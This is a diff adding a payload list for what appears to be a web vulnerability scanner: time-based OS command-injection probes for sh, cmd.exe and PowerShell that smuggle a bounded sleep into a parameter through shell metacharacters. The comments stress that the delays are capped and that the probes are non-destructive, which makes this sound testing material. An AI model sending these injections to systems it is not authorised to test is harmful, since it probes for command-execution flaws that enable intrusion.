@@ -1,0 +1,45 @@
+# Time-based OS command-injection payloads (docs/DESIGN.md §7.3: infer command
+# execution from a bounded delay, comparing against a baseline). %B is the
+# parameter's baseline value; %N is the BOUNDED sleep seconds the probe
+# substitutes (small and capped - never unbounded, never amplifying).
+#
+# BOUNDED IS LOAD-BEARING. The only cost a time-based probe imposes is the delay
+# it induces, so every payload here is a SINGLE, FIXED sleep of %N seconds and
+# nothing else: no loop, no `yes | ...`, no fork bomb, no unbounded read, no
+# nested sleep. modules/dast/active/cmdi.sh clamps %N into 1..10 (default 3)
+# before it ever substitutes it, so a probe delays an authorised target by a few
+# seconds per parameter and can never become a denial-of-service.
+#
+# NON-DESTRUCTIVE (docs/DESIGN.md §7.3; the DAST-36 amendment for DAST-14..DAST-25).
+# A sleep is the canonical NULL side effect: it reads nothing, writes nothing,
+# and exfiltrates nothing - it only makes the response arrive late, which is the
+# signal. No payload here runs a second command that touches the filesystem, the
+# network, or process state.
+#
+# The payload breaks out of the value shape with each shell's own metacharacter,
+# so a value interpolated into a command line - concatenated, backticked, or in a
+# $()/${} context - executes the trailing sleep while a properly escaped one does
+# not. modules/dast/payloads/README.md's format rules apply.
+
+# --- POSIX sh / bash: separator, pipe, background, logical, substitution ---
+%B; sleep %N
+%B; sleep %N #
+%B | sleep %N
+%B || sleep %N
+%B && sleep %N
+%B & sleep %N
+%B$(sleep %N)
+%B`sleep %N`
+;sleep %N
+|sleep %N
+$(sleep %N)
+`sleep %N`
+
+# --- Windows cmd.exe (timeout is a pure, bounded wait) ---
+%B & timeout /T %N /NOBREAK
+%B | timeout /T %N /NOBREAK
+& timeout /T %N /NOBREAK
+
+# --- Windows PowerShell (Start-Sleep is a pure, bounded wait) ---
+%B; Start-Sleep -Seconds %N
+; Start-Sleep -Seconds %N
